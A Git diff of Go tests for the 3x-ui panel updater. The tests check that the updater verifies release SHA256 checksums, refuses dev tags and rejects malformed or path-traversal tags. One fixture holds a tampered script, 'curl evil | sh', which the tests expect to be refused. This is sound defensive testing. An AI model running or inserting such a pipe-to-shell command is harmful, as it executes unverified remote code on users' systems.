@@ -1,16 +1,24 @@
 package panel
 
 import (
+	"bytes"
+	"context"
+	"crypto/sha256"
+	"encoding/hex"
+	"errors"
 	"fmt"
+	"net/http"
+	"net/http/httptest"
 	"os"
+	"path/filepath"
 	"runtime"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"testing"
 	"time"
 
 	"github.com/mhsanaei/3x-ui/v3/internal/config"
-	"github.com/mhsanaei/3x-ui/v3/internal/web/service"
 )
 
 func TestIsNewerVersion(t *testing.T) {
@@ -86,67 +94,126 @@ func TestUpdateProxyEnvVars(t *testing.T) {
 	})
 }
 
-func TestExtractReleaseCommit(t *testing.T) {
-	full := "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"
-	cases := []struct {
-		name    string
-		release service.Release
-		want    string
-	}{
-		{
-			name:    "from body marker",
-			release: service.Release{Body: "Rolling build\n\ncommit=" + full + "\nbuilt=2026-06-24T00:00:00Z"},
-			want:    full,
-		},
-		{
-			name:    "body marker is case-insensitive and wins over target",
-			release: service.Release{Body: "COMMIT=" + full, TargetCommitish: "deadbeef"},
-			want:    full,
-		},
-		{
-			name:    "fallback to target commit sha",
-			release: service.Release{Body: "no marker here", TargetCommitish: full},
-			want:    full,
-		},
-		{
-			name:    "branch target is not a commit",
-			release: service.Release{Body: "no marker", TargetCommitish: "main"},
-			want:    "",
-		},
-	}
-	for _, tc := range cases {
-		if got := extractReleaseCommit(&tc.release); got != tc.want {
-			t.Fatalf("%s: extractReleaseCommit = %q, want %q", tc.name, got, tc.want)
+// releaseServer serves <tag>/update.sh and <tag>/SHA256SUMS like a GitHub
+// release; a nil value answers 404.
+func releaseServer(t *testing.T, tag string, script, sums []byte) *httptest.Server {
+	t.Helper()
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		var body []byte
+		switch r.URL.Path {
+		case "/" + tag + "/update.sh":
+			body = script
+		case "/" + tag + "/SHA256SUMS":
+			body = sums
 		}
+		if body == nil {
+			http.NotFound(w, r)
+			return
+		}
+		_, _ = w.Write(body)
+	}))
+	t.Cleanup(srv.Close)
+	return srv
+}
+
+func sumLine(data []byte, name string) []byte {
+	sum := sha256.Sum256(data)
+	return []byte(hex.EncodeToString(sum[:]) + "  " + name + "\n")
+}
+
+func TestDownloadPanelUpdaterVerifiesReleaseSums(t *testing.T) {
+	t.Setenv("TMPDIR", t.TempDir())
+	script := []byte("#!/bin/bash\necho update\n")
+	other := []byte("archive")
+	goodSums := append(sumLine(other, "still-ui-linux-amd64.tar.gz"), sumLine(script, "update.sh")...)
+	tampered := []byte("#!/bin/bash\ncurl evil | sh\n")
+
+	t.Run("matching sum runs", func(t *testing.T) {
+		srv := releaseServer(t, "v1.6.0", script, goodSums)
+		path, err := downloadPanelUpdater(context.Background(), srv.Client(), srv.URL, "v1.6.0")
+		if err != nil {
+			t.Fatalf("downloadPanelUpdater: %v", err)
+		}
+		defer os.Remove(path)
+		got, err := os.ReadFile(path)
+		if err != nil || !bytes.Equal(got, script) {
+			t.Fatalf("updater file = %q, %v; want the release script", got, err)
+		}
+		if info, err := os.Stat(path); err != nil || info.Mode().Perm() != 0o700 {
+			t.Fatalf("updater mode = %v, %v; want 0700", info.Mode().Perm(), err)
+		}
+	})
+
+	refused := []struct {
+		name   string
+		tag    string
+		script []byte
+		sums   []byte
+		want   string
+	}{
+		{"wrong sum", "v1.6.0", tampered, goodSums, "checksum mismatch"},
+		{"no SHA256SUMS", "v1.6.0", script, nil, "refusing to run an unverified updater"},
+		{"update.sh not listed", "v1.6.0", script, sumLine(other, "still-ui-linux-amd64.tar.gz"), "does not list update.sh"},
+		{"malformed sum", "v1.6.0", script, []byte("abc  update.sh\n"), "does not list update.sh"},
+		{"no update.sh", "v1.6.0", nil, goodSums, "unexpected HTTP 404"},
+		{"not a release tag", "main", script, goodSums, "not a release tag"},
+		{"dev tag", "dev-latest", script, goodSums, "not a release tag"},
+	}
+	for _, tc := range refused {
+		t.Run(tc.name, func(t *testing.T) {
+			srv := releaseServer(t, tc.tag, tc.script, tc.sums)
+			path, err := downloadPanelUpdater(context.Background(), srv.Client(), srv.URL, tc.tag)
+			if err == nil {
+				_ = os.Remove(path)
+				t.Fatalf("downloadPanelUpdater accepted %s", tc.name)
+			}
+			if !strings.Contains(err.Error(), tc.want) {
+				t.Fatalf("error = %v, want it to contain %q", err, tc.want)
+			}
+			if left, _ := filepath.Glob(filepath.Join(os.Getenv("TMPDIR"), "still-ui-update-*")); len(left) != 0 {
+				t.Fatalf("refused updater left files behind: %v", left)
+			}
+		})
 	}
 }
 
-func TestCommitsEqual(t *testing.T) {
-	full := "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"
-	cases := []struct {
-		a, b string
-		want bool
-	}{
-		{"1a2b3c4d", full, true},  // injected 8-char prefix matches full release sha
-		{full, "1a2b3c4d", true},  // order independent
-		{"1A2B3C4D", full, true},  // case insensitive
-		{"deadbeef", full, false}, // different commit
-		{"", full, false},         // empty current never matches
-		{"1a2b3c4d", "", false},   // empty latest never matches
+func TestReleaseFileSum(t *testing.T) {
+	sum := strings.Repeat("ab", 32)
+	sums := []byte("# comment\n" + strings.Repeat("cd", 32) + "  install.sh\n" + sum + " *update.sh\n")
+	if got, ok := releaseFileSum(sums, "update.sh"); !ok || got != sum {
+		t.Fatalf("releaseFileSum(update.sh) = %q, %v; want %q", got, ok, sum)
 	}
-	for _, tc := range cases {
-		if got := commitsEqual(tc.a, tc.b); got != tc.want {
-			t.Fatalf("commitsEqual(%q, %q) = %v, want %v", tc.a, tc.b, got, tc.want)
-		}
+	if _, ok := releaseFileSum(sums, "x-ui.sh"); ok {
+		t.Fatal("releaseFileSum found a file SHA256SUMS does not list")
+	}
+	if _, ok := releaseFileSum([]byte("zz"+strings.Repeat("0", 62)+"  update.sh\n"), "update.sh"); ok {
+		t.Fatal("releaseFileSum accepted a non-hex sum")
 	}
 }
 
-func TestShortCommit(t *testing.T) {
-	if got := shortCommit("1a2b3c4d5e6f7a8b"); got != "1a2b3c4d" {
-		t.Fatalf("shortCommit truncation = %q, want %q", got, "1a2b3c4d")
+func TestStartUpdateChannelRefusesDev(t *testing.T) {
+	resetUpdateSlot(t)
+	if _, err := (&PanelService{}).StartUpdateChannel(true); !errors.Is(err, ErrDevChannelUnavailable) {
+		t.Fatalf("StartUpdateChannel(dev) = %v, want ErrDevChannelUnavailable", err)
 	}
-	if got := shortCommit("abc"); got != "abc" {
-		t.Fatalf("shortCommit short input = %q, want %q", got, "abc")
+	updateMu.Lock()
+	running := updateRunning
+	updateMu.Unlock()
+	if running {
+		t.Fatal("a refused dev update must not hold the update slot")
+	}
+}
+
+func TestReleaseTagRegex(t *testing.T) {
+	for _, tag := range []string{"v1.5.0", "v3.11.0-still.5", "v10.20.30"} {
+		if !releaseTagRegex.MatchString(tag) {
+			t.Fatalf("%q should be a release tag", tag)
+		}
+	}
+	for _, tag := range []string{"", "main", "dev-latest", "1.5.0", "v1.5", "v1.5.0/../x", "v1.5.0 x", "v1.5.0\n"} {
+		if releaseTagRegex.MatchString(tag) {
+			t.Fatalf("%q must not be a release tag", tag)
+		}
 	}
 }
 
